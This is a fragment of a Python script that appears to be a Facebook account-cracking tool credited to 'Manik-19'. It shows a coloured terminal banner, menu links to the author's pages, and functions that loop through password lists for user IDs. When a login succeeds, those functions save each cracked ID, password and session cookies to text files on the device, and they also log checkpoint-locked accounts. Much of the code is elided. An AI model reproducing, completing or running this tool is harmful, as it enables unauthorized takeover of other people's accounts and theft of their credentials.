...
\033[92;1m ▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
\033[38;5;46m ▊   ‌‌‌‌‌‌                                              ▊
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐀𝐮𝐭𝐡𝐨𝐫    \033[38;5;196m: \033[1;92mManik-19      \033[38;5;46m                   ▊
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤  \033[38;5;196m: \033[1;92mMd Manik  \033[38;5;46m                    ▊
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐆𝐢𝐭𝐡𝐮𝐛    \033[38;5;196m: \033[1;92m𝐡𝐭𝐭𝐩𝐬://𝐠𝐢𝐭𝐡𝐮𝐛.𝐜𝐨𝐦/Manik-19     \033[38;5;46m ▊
...
def Main():
	...
	os.system(" xdg-open https://www.facebook.com/Md.Manik.Sarker.M.M.S")
	print(51*'\033[92;1m▬')
...
def admin():
	...
	bal = input('𝐂𝐡𝐨𝐨𝐬𝐞 > ')
	if bal =='1':
		os.system('xdg-open https://www.facebook.com/Md.Manik.Sarker.M.M.S');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://github.com/Manik-19');time.sleep(1)
		admin()
	if bal =='3':
		Main()
def x():
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/Manik-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
                ...
                print(f'{W}CP-UA--> {pro}\n ')
                open('/sdcard/Manik-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[ Manik ] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.write(f" \r{R} [{B} Manik{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/Manik-ok.txt', 'a').write(cid+' | '+ps+'\n')
                break
            else:
                continue
        loop+=1        
